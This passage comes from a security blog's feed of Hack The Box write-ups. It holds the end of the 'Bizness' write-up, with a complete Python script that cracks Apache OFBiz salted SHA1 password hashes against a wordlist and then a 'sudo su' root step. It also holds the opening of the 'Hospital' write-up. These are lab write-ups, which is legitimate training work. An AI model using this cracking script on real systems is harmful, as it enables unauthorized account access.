+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">argparse&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">hashlib&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">base64&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">os&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">cryptBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">hash_type&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_type&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;SHA&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="ow">not&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">salt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">urlsafe_b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">os&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">urandom&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_obj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">hashlib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">salt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hashed_bytes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">hash_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">digest&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">result&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">salt&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">urlsafe_b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hashed_bytes&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;+&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">result&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">getCryptedBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">try&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_obj&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">hashlib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">new&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">salt&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hashed_bytes&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">hash_obj&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">digest&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">base64&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">urlsafe_b64encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hashed_bytes&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">decode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;+&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;.&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">except&lt;/span> &lt;span class="n">hashlib&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">NoSuchAlgorithmException&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">e&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">raise&lt;/span> &lt;span class="ne">Exception&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Error while computing hash of type &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">e&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">parser&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">argparse&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ArgumentParser&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">description&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Brute force Apache OFBiz SHA1 hashes. Just something you might want to do....&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">parser&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_argument&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;--hash-string&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">help&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Hash string in the format &amp;#39;$TYPE$SALT$HASH&amp;#39;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">required&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">parser&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">add_argument&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;--wordlist&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">help&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Path to the wordlist file&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">default&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;/usr/share/wordlists/rockyou.txt&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">required&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">args&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">parser&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">parse_args&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_components&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hash_string&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;$&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hash_type&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">findhash&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">hash_components&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">hash_components&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">],&lt;/span> &lt;span class="n">hash_components&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">attempts&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">with&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">wordlist&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;r&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">encoding&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;latin-1&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">password_list&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[+] Attempting to crack....&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">password&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="n">password_list&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">attempts&lt;/span> &lt;span class="o">+=&lt;/span> &lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">value&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">hashed_password&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">cryptBytes&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">hash_type&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">salt&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">value&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">hashed_password&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">args&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">hash_string&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;Found Password: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">value&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;hash: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">hashed_password&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s1">&amp;#39;(Attempts: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">attempts&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s1">)&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[!] Super, I bet you could log into something with that!&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">break&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;[!] Password not found in the wordlist. :( (Attempts: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">attempts&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">)&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s2">&amp;#34;__main__&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Crack the password : mon*********s and do&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo su
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Voila !&lt;/p>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/root.png"
+width="926"
+height="240"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/root_hu1acca673751cca7afff534719c92d1ed_59760_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/root_hu1acca673751cca7afff534719c92d1ed_59760_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Root flag"
+class="gallery-image"
+data-flex-grow="385"
+data-flex-basis="926px"
+>&lt;/p>
+&lt;p>This intricate process showcases the meticulous steps taken to navigate through files, directories, and databases, employing various commands to unveil crucial information and execute a successful privilege escalation.&lt;/p>
+&lt;h2 id="done">Done&lt;/h2>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/done.png"
+width="618"
+height="551"
+srcset="https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/done_hu339944034bf17a4556fdba8e42068f0d_104309_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/bizness-writeup/Bizness_Pic/done_hu339944034bf17a4556fdba8e42068f0d_104309_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="The Ebd"
+class="gallery-image"
+data-flex-grow="112"
+data-flex-basis="269px"
+>&lt;/p></description></item><item><title>Hospital Writeup</title><link>https://shaanksm.github.io/p/hospital-writeup/</link><pubDate>Thu, 08 Feb 2024 00:00:00 +0000</pubDate><guid>https://shaanksm.github.io/p/hospital-writeup/</guid><description>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hospital.png" alt="Featured image of post Hospital Writeup" />&lt;h1 id="hospital-htb---writeup">HOSPITAL HTB - WRITEUP&lt;/h1>
+&lt;h2 id="introduction">Introduction&lt;/h2>
+&lt;p>Welcome to &amp;ldquo;Hospital&amp;rdquo; on Hack The Box, an immersive cybersecurity challenge designed to test your prowess across both Linux and Windows environments. Within this simulated hospital setting, you&amp;rsquo;ll encounter a diverse array of vulnerabilities, ranging from upload RCE exploits to intricate password hash cracking techniques. Our mission ? Is to navigate through this challenge, leveraging ours skills to strengthen the hospital&amp;rsquo;s security posture.
+By delving into the intricacies of both operating systems, we&amp;rsquo;ll gain invaluable experience in penetration testing and vulnerability assessment. Together, let&amp;rsquo;s embark on this journey to fortify Hospital against cyber threats and ensure the safety of its digital infrastructure. Are you ready to rise to the challenge? Let&amp;rsquo;s begin our quest for enhanced security.&lt;/p>
+&lt;h2 id="matrix">Matrix&lt;/h2>
+&lt;p>&lt;img src="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/matrix.png"
+width="341"
+height="302"
+srcset="https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/matrix_hube9c41c08d3318888d156519cd1f451e_31505_480x0_resize_box_3.png 480w, https://shaanksm.github.io/p/hospital-writeup/Hos_Pic/matrix_hube9c41c08d3318888d156519cd1f451e_31505_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Matrix&amp;rsquo;s Machine"
+class="gallery-image"
+data-flex-grow="112"
+data-flex-basis="270px"
+>&lt;/p>
+&lt;h2 id="enumeration">Enumeration&lt;/h2>
+&lt;p>I kick off the process by enumerating ports using AutoRecon(Tool only for CTF environnemnt, too noisy in real pentest imo&amp;rsquo;) and it appear that we&amp;rsquo;ve an AD ? I&amp;rsquo;m left my dog Bloody outsite ..&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;span class="lnt">126
+&lt;/span>&lt;span class="lnt">127
+&lt;/span>&lt;span class="lnt">128
+&lt;/span>&lt;span class="lnt">129
+&lt;/span>&lt;span class="lnt">130
+&lt;/span>&lt;span class="lnt">131
+&lt;/span>&lt;span class="lnt">132
+&lt;/span>&lt;span class="lnt">133
+&lt;/span>&lt;span class="lnt">134
+&lt;/span>&lt;span class="lnt">135
+&lt;/span>&lt;span class="lnt">136
+&lt;/span>&lt;span class="lnt">137
+&lt;/span>&lt;span class="lnt">138
+&lt;/span>&lt;span class="lnt">139
+&lt;/span>&lt;span class="lnt">140
+&lt;/span>&lt;span class="lnt">141
+&lt;/span>&lt;span class="lnt">142
+&lt;/span>&lt;span class="lnt">143
+&lt;/span>&lt;span class="lnt">144
+&lt;/span>&lt;span class="lnt">145
+&lt;/span>&lt;span class="lnt">146
+&lt;/span>&lt;span class="lnt">147
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
